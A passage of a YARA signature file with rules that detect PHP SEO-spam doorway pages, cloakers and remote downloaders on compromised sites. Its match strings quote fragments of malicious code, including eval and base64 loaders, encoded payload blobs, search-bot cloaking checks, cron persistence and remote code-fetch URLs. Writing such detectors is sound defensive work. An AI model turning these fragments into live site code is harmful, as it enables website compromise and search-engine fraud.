        $trigger = "header('Content-Type:"
    condition:
        $trigger and PR01021 and PR06100 and PR01431
}

// MANUAL FIX NECESSARY
rule php_spamseo_doorwaygen_087 : spamseo
{
    strings:
        $trigger = "));$"
        $php_spamseo_doorwaygen_087_r0 = /<\?php\s*\$\w+\s*=\s*['\"][^;]+;\s*(\$\w+\s*=\s*\$\w+\[\d+\]\s*\.\s*\$\w+\[\d+\]\s*\.[^;]+;){2,}\$\w+\(\d+\)\s*;\s*\$\w+\s*=\s*\$\w+\(['\"]{2}\s*,\s*\$\w+\(\$\w+\(['\"][^\)]+[\)\s]+\s*;\s*\$\w+\(\)\s*;/
    condition:
        $trigger and $php_spamseo_doorwaygen_087_r0
}

// MANUAL FIX NECESSARY
rule php_spamseo_doorwaygen_087_02 : spamseo
{
    strings:
        $trigger = "));$"
        $php_spamseo_doorwaygen_087_02_r0 = /<\?php\s*(\$[\w]+\s*=\s*'[^']+'\s*\^\s*'[^']+';){2,}\$\w+\s*=\s*\$\w+\('',\s*\$\w+\(\$\w+\('[^']+'\s*\^\s*'[^']+'[\s)]+;\s*\$\w+\(\)\s*;/
    condition:
        $trigger and $php_spamseo_doorwaygen_087_02_r0
}

private rule PR06101 : trigger
{
    strings:
        $ps0 = "str_replace(\"</span>\", \"\", $"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_089 : spamseo
{
    strings:
        $trigger = "echo \"<p>\".implode($"
    condition:
        $trigger and PR01431 and PR06101
}

private rule PR06102 : trigger
{
    strings:
        $ps0 = "echo \"<html><head><meta http-equiv='refresh' content='0; url=$"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_090 : spamseo
{
    strings:
        $trigger = "header('Content-Type:"
    condition:
        $trigger and PR06102 and PR01431
}

private rule PR06103 : trigger
{
    strings:
        $ps0 = "$url_array = file(\"files/url.txt\""
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_091 : spamseo
{
    strings:
        $trigger = "require_once(\"files/config.inc\")"
    condition:
        $trigger and PR06103
}

private rule PR06104 : trigger
{
    strings:
        $ps0 = "document.write('<'+"
    condition:
        $ps0
}

private rule PR06105 : trigger
{
    strings:
        $ps0 = "= substr(md5($_SERVER['QUERY_STRING'])"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_091_02 : spamseo
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']"
    condition:
        $trigger and PR06104 and PR06105
}

private rule PR06106 : trigger
{
    strings:
        $ps0 = "require_once(\"files/config.inc\")"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_091_03 : spamseo
{
    strings:
        $trigger = "= str_ireplace('</head>','<script type=\"text/javascript\">var '.str_replace(array("
    condition:
        $trigger and PR06106
}

private rule PR06107 : trigger
{
    strings:
        $ps0 = "create_file(\"config.inc\",$"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_091_04 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR06107 and PR00357
}

private rule PR06108 : trigger
{
    strings:
        $ps0 = "create_file"
    condition:
        $ps0
}

private rule PR06109 : trigger
{
    strings:
        $ps0 = "echo('<a href=\"'.$_SERVER['REQUEST_URI'].'?file='.$"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_091_05 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06108 and PR06109 and PR00355 and PR00357
}

private rule PR06110 : trigger
{
    strings:
        $ps0 = "aWYoJHRtcFsnaG9zdCddKX"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_092 : spamseo
{
    strings:
        $trigger = "$outputData = create_function(false, $rawData);"
    condition:
        $trigger and PR06110 and PR01479
}

private rule PR06111 : trigger
{
    strings:
        $ps0 = "$productid=str_replace('.html','',$productid);"
    condition:
        $ps0
}

private rule PR06112 : trigger
{
    strings:
        $ps0 = "$indextitle"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_093 : spamseo
{
    strings:
        $trigger = "HTTP_USER_AGENT"
    condition:
        $trigger and PR06111 and PR06112 and PR00070
}

private rule PR06113 : trigger
{
    strings:
        $ps0 = "function havelinks()"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_094 : spamseo
{
    strings:
        $trigger = "preg_match('/wp-login.php|wp-admin|administrator/i"
    condition:
        $trigger and PR00039 and PR02056 and PR06113 and PR01788
}

private rule PR06114 : trigger
{
    strings:
        $ps0 = "sE8Ot7r9UPvQct5BIMT/uS0Wc2dF8WHKFsnIACTyDKI6dKbN1e3uH2q+bBmzfwFvn9sHHwtmDHk0FqBuIJ8mu44x69O/kv"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_096 : spamseo
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR06114 and PR00029
}

private rule PR06115 : trigger
{
    strings:
        $ps0 = "(in_array($ip, $bot_list))"
    condition:
        $ps0
}

private rule PR06116 : trigger
{
    strings:
        $ps0 = "(trim($qcall)!="
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_097 : spamseo
{
    strings:
        $trigger = "preg_replace"
    condition:
        $trigger and PR06115 and PR06116 and PR01439
}

private rule PR06117 : trigger
{
    strings:
        $ps0 = "$JsHttpRequest = new Subsys_JsHttpRequest_Php"
    condition:
        $ps0
}

private rule PR06118 : trigger
{
    strings:
        $ps0 = "$out_data = fread($fid_pe,"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_098 : spamseo
{
    strings:
        $trigger = "require_once"
    condition:
        $trigger and PR06117 and PR06118
}

rule php_spamseo_doorwaygen_099 : spamseo
{
    strings:
        $trigger = "eval(base64_decode(\"LyoqDQogKiBTaWduYXR1cmUgRm9yIFJlcG9ydA"
    condition:
        $trigger
}

rule php_spamseo_doorwaygen_101 : spamseo
{
    strings:
        $trigger = "$homepage=str_replace_once(\"<title>"
    condition:
        $trigger and PR00355 and PR00357 and PR01431
}

private rule PR06119 : trigger
{
    strings:
        $ps0 = "function getRealua()"
    condition:
        $ps0
}

private rule PR06120 : trigger
{
    strings:
        $ps0 = "function getRealref()"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_102 : spamseo
{
    strings:
        $trigger = "$_SERVER['GEOIP_ADDR"
    condition:
        $trigger and PR06119 and PR06120 and PR01522
}

private rule PR06121 : trigger
{
    strings:
        $ps0 = "$_SERVER['GEOIP_ADDR"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_102_02 : spamseo
{
    strings:
        $trigger = "@session_start();"
    condition:
        $trigger and PR06120 and PR01522 and PR06121
}

rule php_spamseo_doorwaygen_102_03 : spamseo
{
    strings:
        $trigger = "$_SERVER['GEOIP_ADDR"
    condition:
        $trigger and PR01392 and PR06120 and PR01522
}

private rule PR06122 : trigger
{
    strings:
        $ps0 = "); goto"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_102_04 : spamseo
{
    strings:
        $trigger = "\"\\x"
    condition:
        $trigger and PR06120 and PR01522 and PR06122
}

private rule PR06123 : trigger
{
    strings:
        $ps0 = "$______"
    condition:
        $ps0
}

private rule PR06124 : trigger
{
    strings:
        $ps0 = "$__='printf';$_='Loading"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_103 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06123 and PR06124
}

private rule PR06125 : trigger
{
    strings:
        $ps0 = "<title>[TITLE]</title>"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_104 : spamseo
{
    strings:
        $trigger = "function check_br()"
    condition:
        $trigger and PR06125
}

// MANUAL FIX NECESSARY
rule php_spamseo_doorwaygen_106 : spamseo
{
    strings:
        $trigger = "chr"
        $php_spamseo_doorwaygen_106_r0 = /\.\s*chr\(\d+\)\s*\./
        $php_spamseo_doorwaygen_106_r1 = /\$[\w]+[\s]*=[\s]*([\W][\w]*[\W]\.?)*;[\s]*\$[\w]+[\s]*=[\s]*array\(.{1000,}eval\(\$[\w]+\(\$[\w]+\(\$[\w]+\(..,\$[\w]+\)\)\)\);/
    condition:
        $trigger and $php_spamseo_doorwaygen_106_r0 and $php_spamseo_doorwaygen_106_r1
}

rule php_spamseo_doorwaygen_108 : spamseo
{
    strings:
        $trigger = "if(md5(file_get_contents(__FILE__))!=$_POST['md5_new_set']){"
    condition:
        $trigger
}

rule php_spamseo_doorwaygen_109_02 : spamseo
{
    strings:
        $trigger = "$workerHash = md5_file($_SERVER[\"DOCUMENT_ROOT\"].'/'.$task['key"
    condition:
        $trigger and PR00435
}

rule php_spamseo_doorwaygen_109_03 : spamseo
{
    strings:
        $trigger = "crontab.txt', '* * * * * usr/bin/php '.getcwd().'/'.$launcher.'.php"
    condition:
        $trigger and PR00435
}

rule php_spamseo_doorwaygen_109_04 : spamseo
{
    strings:
        $trigger = "exec('php '.getcwd().'/'.$fold.'/'.$worker.'.php"
    condition:
        $trigger and PR00435
}

private rule PR06126 : trigger
{
    strings:
        $ps0 = "wBcfJjvnrV5K7g7PEkt313Dvveae6MwDJZDKZTCYzySR"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_110 : spamseo
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR06126
}

rule php_spamseo_doorwaygen_111 : spamseo
{
    strings:
        $trigger = "create_function('', gzuncompress(base64_decode(\"eAHNW1lzG"
    condition:
        $trigger
}

private rule PR06127 : trigger
{
    strings:
        $ps0 = "fakebot.enabled"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_112 : spamseo
{
    strings:
        $trigger = "door page rendered"
    condition:
        $trigger and PR06127 and PR01693
}

private rule PR06128 : trigger
{
    strings:
        $ps0 = "str_replace(basename($_SERVER['SCRIPT_URI']),\"\", $result['PostURL']);"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_113 : spamseo
{
    strings:
        $trigger = "fopen"
    condition:
        $trigger and PR06128 and PR04510
}

rule php_spamseo_doorwaygen_114 : spamseo
{
    strings:
        $trigger = "array_map(\"base64_decode\", unserialize($"
    condition:
        $trigger and PR01483
}

private rule PR06129 : trigger
{
    strings:
        $ps0 = "curl_setopt($ch, CURLOPT_URL, \"http"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_115 : spamseo
{
    strings:
        $trigger = "AND (str_word_count($keywords)<"
    condition:
        $trigger and PR06129 and PR00355 and PR00357 and PR01431
}

private rule PR06130 : trigger
{
    strings:
        $ps0 = "$page = new Page($template, $text, $keyword, Blog::gen_links(Blog::$min_page_links"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_116 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01428 and PR01021 and PR06130
}

rule php_spamseo_doorwaygen_117 : spamseo
{
    strings:
        $trigger = "preg_replace('#<script(.*)"
    condition:
        $trigger and PR03597
}

private rule PR06131 : trigger
{
    strings:
        $ps0 = "require_once(ABSPATH . 'wp-settings.php');"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_117_02 : spamseo
{
    strings:
        $trigger = "preg_replace('#<script(.*)"
    condition:
        $trigger and PR06131 and PR03597
}

private rule PR06132 : trigger
{
    strings:
        $ps0 = "array('google', 'yandex', 'bing', 'GeccoBot');"
    condition:
        $ps0
}

private rule PR06133 : trigger
{
    strings:
        $ps0 = "strpos_array($_SERVER['HTTP_USER_AGENT'],"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_118 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06132 and PR01021 and PR01569 and PR06133
}

private rule PR06134 : trigger
{
    strings:
        $ps0 = "\"POST {$url['path']}?bot_ip=\" . urlencode($_SERVER['REMOTE_ADDR']) . \" HTTP/1.1\\r\\n\";"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_119 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01428 and PR06134 and PR01021
}

private rule PR06135 : trigger
{
    strings:
        $ps0 = "ZnpoYW5xdW4uY29t"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_120 : spamseo
{
    strings:
        $trigger = "base64_decode($"
    condition:
        $trigger and PR01480 and PR01468 and PR06135
}

private rule PR06136 : trigger
{
    strings:
        $ps0 = "kQeuaDlnvHKY5sLuWvkXuByfFbONOI2ghIPkdTAjmUIJOhvJNJcFKxd3OzpBx"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_121 : spamseo
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR06136
}

private rule PR06137 : trigger
{
    strings:
        $ps0 = "asmoutdo("
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_122 : spamseo
{
    strings:
        $trigger = "return $"
    condition:
        $trigger and PR01021 and PR06137 and PR01569 and PR01431
}

private rule PR06138 : trigger
{
    strings:
        $ps0 = "_([a-zA-Z0-9]+)\\.html/i\", $_SERVER[\"REQUEST_URI\"],"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_123 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06138 and PR01431
}

private rule PR06139 : trigger
{
    strings:
        $ps0 = "$xmlDir = 'sitemap';"
    condition:
        $ps0
}

private rule PR06140 : trigger
{
    strings:
        $ps0 = "}.$O"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_125 : spamseo
{
    strings:
        $trigger = "global $xmlDir,$mapMin,$mapMax,$mapNum,$mapPrefix,$plusNum;"
    condition:
        $trigger and PR01350 and PR06139 and PR06140
}

private rule PR06141 : trigger
{
    strings:
        $ps0 = "$GLOBALS['show_xpost_lnk']"
    condition:
        $ps0
}

private rule PR06142 : trigger
{
    strings:
        $ps0 = "function mysqlTableSeekWP($"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_126 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01021 and PR06141 and PR06142
}

private rule PR06143 : trigger
{
    strings:
        $ps0 = "$content=str_replace('class"
    condition:
        $ps0
}

private rule PR06144 : trigger
{
    strings:
        $ps0 = "function replace_index"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_127 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01428 and PR06143 and PR01021 and PR06144
}

rule php_spamseo_doorwaygen_128 : spamseo
{
    strings:
        $trigger = "JEhvZXJ6az0iRE1tQVlKcHJORVpxalJRbkd3SWdLVnVCY09pYlRQZUNkemxTeW"
    condition:
        $trigger and PR00029 and PR00265
}

private rule PR06145 : trigger
{
    strings:
        $ps0 = "unserialize($doorkeys);if (!is_array($doorkeys) || count($doorkeys) == 0) {echo"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_129 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR06145 and PR00357
}

private rule PR06146 : trigger
{
    strings:
        $ps0 = "return \"http://{$domain}/get_core_files\";"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_130 : spamseo
{
    strings:
        $trigger = "$GLOBALS['_ta_campaign_key']"
    condition:
        $trigger and PR06146
}

private rule PR06147 : trigger
{
    strings:
        $ps0 = "print load_fullscreen_iframe($response['url']);"
    condition:
        $ps0
}

private rule PR06148 : trigger
{
    strings:
        $ps0 = "$GLOBALS['_ta_campaign_key']"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_130_02 : spamseo
{
    strings:
        $trigger = "get_"
    condition:
        $trigger and PR06147 and PR06148
}

rule php_spamseo_doorwaygen_132 : spamseo
{
    strings:
        $trigger = "['a'] == 'doorway2') {if ($_"
    condition:
        $trigger and PR01818 and PR00029 and PR00507
}

private rule PR06149 : trigger
{
    strings:
        $ps0 = "eyJhZGJsb2NrIjp7fSwiZXhjbHVkZXMiOiIifQ"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_133 : spamseo
{
    strings:
        $trigger = "='b"
    condition:
        $trigger and PR00029 and PR06149 and PR01411
}

private rule PR06150 : trigger
{
    strings:
        $ps0 = "_url_tek=xinclude(\"$x"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_134 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR01392 and PR06150 and PR00357
}

private rule PR06151 : trigger
{
    strings:
        $ps0 = "$this->pagesData[$link]. '</a>"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_135 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06151 and PR01468 and PR01469
}

rule php_spamseo_doorwaygen_136 : spamseo
{
    strings:
        $trigger = "lVsLc9u2sv4rjMKGZEtTDzuuH6KTTOw0npOHr63cdsZxNRQJibymSF6C8qO2z28/uwuABCk57ZlOZRJcLBa"
    condition:
        $trigger and PR00029 and PR01436
}

private rule PR06152 : trigger
{
    strings:
        $ps0 = "getContents($gourl);"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_137 : spamseo
{
    strings:
        $trigger = "return $"
    condition:
        $trigger and PR06152 and PR01021 and PR01569 and PR01431
}

private rule PR06153 : trigger
{
    strings:
        $ps0 = "$requestsTitles = array"
    condition:
        $ps0
}

private rule PR06154 : trigger
{
    strings:
        $ps0 = "function findMatches($request,"
    condition:
        $ps0
}

private rule PR06155 : trigger
{
    strings:
        $ps0 = "<?php echo $title ?></title>"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_138 : spamseo
{
    strings:
        $trigger = "data:text/javascript;base64"
    condition:
        $trigger and PR00050 and PR00056 and PR06153 and PR06154 and PR06155
}

private rule PR06156 : trigger
{
    strings:
        $ps0 = "$keysArr = explode"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_138_02 : spamseo
{
    strings:
        $trigger = "data:text/javascript;base64"
    condition:
        $trigger and PR00050 and PR00056 and PR06154 and PR06155 and PR06156
}

private rule PR06157 : trigger
{
    strings:
        $ps0 = "&page=' . $rUrl . '&bot="
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_139 : spamseo
{
    strings:
        $trigger = "function sitefun($"
    condition:
        $trigger and PR00355 and PR06157 and PR01392 and PR00357 and PR01431
}

private rule PR06158 : trigger
{
    strings:
        $ps0 = "$rootPath"
    condition:
        $ps0
}

private rule PR06159 : trigger
{
    strings:
        $ps0 = "$domain = str_replace(\"*\", \"www\", $domain);"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_141 : spamseo
{
    strings:
        $trigger = "return $"
    condition:
        $trigger and PR06158 and PR06159 and PR01021 and PR01569 and PR01431
}

private rule PR06160 : trigger
{
    strings:
        $ps0 = "str_replace(\".html\""
    condition:
        $ps0
}

private rule PR06161 : trigger
{
    strings:
        $ps0 = "strpos($url, '&sitemap=xml"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_142 : spamseo
{
    strings:
        $trigger = "Googlebot"
    condition:
        $trigger and PR06160 and PR00091 and PR06161
}

private rule PR06162 : trigger
{
    strings:
        $ps0 = "$inter_domain"
    condition:
        $ps0
}

private rule PR06163 : trigger
{
    strings:
        $ps0 = "echo $data_new.'===>Submitting Google Sitemap: OK'.PHP_EOL;"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_143 : spamseo
{
    strings:
        $trigger = "return $"
    condition:
        $trigger and PR06162 and PR06163 and PR01569 and PR01431
}

private rule PR06164 : trigger
{
    strings:
        $ps0 = "@socket_create(AF_INET, SOCK_STREAM, SOL_TCP);"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_144 : spamseo
{
    strings:
        $trigger = "return $"
    condition:
        $trigger and PR01021 and PR06164 and PR01569 and PR01431
}

// MANUAL FIX NECESSARY
rule php_spamseo_doorwaygen_145 : spamseo
{
    strings:
        $trigger = "Z25vcmVfdXNlcl9hYm9ydCgxKTs"
        $php_spamseo_doorwaygen_145_r0 = /<\?php[\s]*@?eval/
    condition:
        $trigger and PR00029 and $php_spamseo_doorwaygen_145_r0
}

rule php_spamseo_doorwaygen_146 : spamseo
{
    strings:
        $trigger = "strlen($html) < 200 && strpos($html, 'window.location"
    condition:
        $trigger and PR01431 and PR02165 and PR01021
}

private rule PR06165 : trigger
{
    strings:
        $ps0 = "$open_pages[\"$open_meta\"];}elseif(isset($open_pages[\"$open_links\"]"
    condition:
        $ps0
}

private rule PR06166 : trigger
{
    strings:
        $ps0 = "function wp_file_see($file)"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_147 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06165 and PR06166 and PR00357
}

private rule PR06167 : trigger
{
    strings:
        $ps0 = "AAA=H4sIAAA"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_148 : spamseo
{
    strings:
        $trigger = "0000001cH4sIAAAAA"
    condition:
        $trigger and PR06167
}

private rule PR06168 : trigger
{
    strings:
        $ps0 = "{echo fgets(${$"
    condition:
        $ps0
}

private rule PR06169 : trigger
{
    strings:
        $ps0 = "OR(mb_stripos($"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_149 : spamseo
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR03969 and PR06168 and PR06169
}

private rule PR06170 : trigger
{
    strings:
        $ps0 = "PEZpbGVzTWF0Y2ggIi4ocGhwfHBocDV8cGh0bWwpJCI+Ck9yZGVyIGFsbG93LGRlbnkKRGVueS"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_150 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02149 and PR06170
}

private rule PR06171 : trigger
{
    strings:
        $ps0 = "($string){$array=strlen(trim($string));$debuger='';for"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_151 : spamseo
{
    strings:
        $trigger = "<?php error_reporting(0);"
    condition:
        $trigger and PR06171
}

rule php_spamseo_doorwaygen_152 : spamseo
{
    strings:
        $trigger = ".=base64_decode('Q29ubmVjdGlvbjogQ2xvc2UNCg0K');fwrite($"
    condition:
        $trigger and PR00042 and PR02051 and PR01735
}

rule php_spamseo_doorwaygen_153 : spamseo
{
    strings:
        $trigger = "echo 'ok#ping ' . $link . ' ok <br/>';"
    condition:
        $trigger and PR00507
}

private rule PR06172 : trigger
{
    strings:
        $ps0 = ".= PHP_EOL . \"\\"
    condition:
        $ps0
}

private rule PR06173 : trigger
{
    strings:
        $ps0 = "header(\"\\x"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_154 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06172 and PR06173 and PR01021 and PR02141
}

private rule PR06174 : trigger
{
    strings:
        $ps0 = "file_put_contents(__DIR__.'/queue/'.$i.'_'.rand(1,999999),"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_155 : spamseo
{
    strings:
        $trigger = "(int) trim(@file_get_contents(__DIR__.'/googlelinksupdate"
    condition:
        $trigger and PR06174
}

private rule PR06175 : trigger
{
    strings:
        $ps0 = "$result =$this->do_curl_request($this->site_url, $json_params);"
    condition:
        $ps0
}

private rule PR06176 : trigger
{
    strings:
        $ps0 = "$crawler->doAction();"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_156 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR00507 and PR06175 and PR06176
}

private rule PR06177 : trigger
{
    strings:
        $ps0 = "else if($output == \"BLOCK\")"
    condition:
        $ps0
}

private rule PR06178 : trigger
{
    strings:
        $ps0 = "=\".api_token.\"&user=\".$data['user_token'].\"&rdr=https://\".$server_ip."
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_157 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06177 and PR01428 and PR01021 and PR06178
}

private rule PR06179 : trigger
{
    strings:
        $ps0 = "array_pop(explode("
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_158 : spamseo
{
    strings:
        $trigger = "get_page($url_page);"
    condition:
        $trigger and PR00435 and PR06179 and PR00341
}

private rule PR06180 : trigger
{
    strings:
        $ps0 = "echo '<br>sitemap already added!"
    condition:
        $ps0
}

private rule PR06181 : trigger
{
    strings:
        $ps0 = "$duri_tmp = drequest_uri();"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_159 : spamseo
{
    strings:
        $trigger = "return $"
    condition:
        $trigger and PR06180 and PR06181 and PR01569 and PR01431
}

// MANUAL FIX NECESSARY
private rule PR06182 : trigger
{
    strings:
        $ps0 = "ineedthispage=yes"
    condition:
        $ps0
}

rule php_spamseo_doorwayineed_001 : spamseo
{
    strings:
        $trigger = "door"
        $php_spamseo_doorwayineed_001_r0 = /<\?php[\s]*if[\s]*\(+empty\(\$_GET\[.ineedthispage/
    condition:
        $trigger and PR06182 and $php_spamseo_doorwayineed_001_r0
}

private rule PR06183 : trigger
{
    strings:
        $ps0 = "$newclient = $new_request->request(\"http"
    condition:
        $ps0
}

private rule PR06184 : trigger
{
    strings:
        $ps0 = "door"
    condition:
        $ps0
}

rule php_spamseo_doorwayineed_002 : spamseo
{
    strings:
        $trigger = "HttpRequest($useCurl"
    condition:
        $trigger and PR06183 and PR06182 and PR06184
}

private rule PR06185 : trigger
{
    strings:
        $ps0 = "gzcompress(base64_encode"
    condition:
        $ps0
}

rule php_spamseo_doorwayineed_003 : spamseo
{
    strings:
        $trigger = "gzuncompress(urldecode"
    condition:
        $trigger and PR06182 and PR06184 and PR06185
}

private rule PR06186 : trigger
{
    strings:
        $ps0 = "$curr"
    condition:
        $ps0
}

rule php_spamseo_doorwayineed_004 : spamseo
{
    strings:
        $trigger = "function placeLinks"
    condition:
        $trigger and PR06186 and PR06182 and PR06184
}

private rule PR06187 : trigger
{
    strings:
        $ps0 = "$pills=explode('|',$pills);"
    condition:
        $ps0
}

rule php_spamseo_doorwaypharma_001 : spamseo
{
    strings:
        $trigger = "<title>404 Not Found</title>"
    condition:
        $trigger and PR06187
}

private rule PR06188 : trigger
{
    strings:
        $ps0 = "pOw0KaWYgKCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTw+IkZTTkVUIi"
    condition:
        $ps0
}

rule php_spamseo_doorwaypharma_002 : spamseo
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR06188 and PR00029
}

private rule PR06189 : trigger
{
    strings:
        $ps0 = "\\x2f\\50\\x2e\\52\\x29\\57\\x65\""
    condition:
        $ps0
}

rule php_spamseo_doorwaypharma_002_02 : spamseo
{
    strings:
        $trigger = "preg_replace"
    condition:
        $trigger and PR06189 and PR00719
}

private rule PR06190 : trigger
{
    strings:
        $ps0 = "= \"<b>Client type-</b> \" . $"
    condition:
        $ps0
}

rule php_spamseo_doorway_b9i9n9g_001_01 : spamseo
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']"
    condition:
        $trigger and PR06190
}

private rule PR06191 : trigger
{
    strings:
        $ps0 = "Accept-Language: zh-cn"
    condition:
        $ps0
}

private rule PR06192 : trigger
{
    strings:
        $ps0 = "eval (http_get"
    condition:
        $ps0
}

rule php_spamseo_doorway_downloader_002 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06191 and PR01428 and PR06192 and PR01021
}

rule php_spamseo_doorway_downloader_003 : spamseo
{
    strings:
        $trigger = "if ($str === false && ini_get(\"allow_url_fopen\") == \"1\") {"
    condition:
        $trigger and PR00431
}

rule php_spamseo_doorway_downloader_004 : spamseo
{
    strings:
        $trigger = "$Remote_directory = $Remote_server.\"/d.php\".\"?type=index.php&host=\".$host_name.\"&directory=\".$Branch;"
    condition:
        $trigger
}

rule php_spamseo_doorway_downloader_005 : spamseo
{
    strings:
        $trigger = "if (eregi('-dbst',$_SERVER['REQUEST_URI'])) {"
    condition:
        $trigger and PR00092
}

rule php_spamseo_doorway_downloader_007 : spamseo
{
    strings:
        $trigger = "$xia = '<a href=\"' . $pathurl . $preFix . $midFix . $nextUrl . $sufFix"
    condition:
        $trigger and PR00042
}

private rule PR06193 : trigger
{
    strings:
        $ps0 = "if (!file_exists($UpFN)) die(\"No API\");"
    condition:
        $ps0
}

rule php_spamseo_doorway_downloader_008 : spamseo
{
    strings:
        $trigger = "touch("
    condition:
        $trigger and PR06193
}

rule php_spamseo_doorway_downloader_009 : spamseo
{
    strings:
        $trigger = "$Remote_directory = $Remote_server.\"/pstmu.asp\""
    condition:
        $trigger and PR00092
}

private rule PR06194 : trigger
{
    strings:
        $ps0 = "_useragent, 'yahoo')!==false || strpos($"
    condition:
        $ps0
}

private rule PR06195 : trigger
{
    strings:
        $ps0 = "_my_images = curl_get($"
    condition:
        $ps0
}

rule php_spamseo_doorway_downloader_011 : spamseo
{
    strings:
        $trigger = "_query = urlencode(trim($_GET[\"type\"]));"
    condition:
        $trigger and PR06194 and PR06195
}

private rule PR06196 : trigger
{
    strings:
        $ps0 = "$out = str_replace('[##jumpcode##]', $jumpcode, $out);"
    condition:
        $ps0
}

rule php_spamseo_doorway_downloader_012 : spamseo
{
    strings:
        $trigger = "$pro_param = isset($_GET[\"pro_param\"])?$_GET[\"pro_param\"]:\"\";"
    condition:
        $trigger and PR01401 and PR06196
}

private rule PR06197 : trigger
{
    strings:
        $ps0 = "Header (\"Location: \".$out_url);"
    condition:
        $ps0
}

rule php_spamseo_doorway_downloader_013 : spamseo
{
    strings:
        $trigger = "$actual_redir_url=trim(@file_get_contents(base64_decode($e2)));"
    condition:
        $trigger and PR06197
}

private rule PR06198 : trigger
{
    strings:
        $ps0 = "} } else { if(file_exists($home_dir.'cache/'.$uric.'_cache.txt')) { $code = @file_get"
    condition:
        $ps0
}

rule php_spamseo_doorway_downloader_014 : spamseo
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR06198
}

rule php_spamseo_doorway_downloader_015 : spamseo
{
    strings:
        $trigger = "$str_hm = curl_get_from_webpage_one_time(\"http:"
    condition:
        $trigger and PR00070
}

private rule PR06199 : trigger
{
    strings:
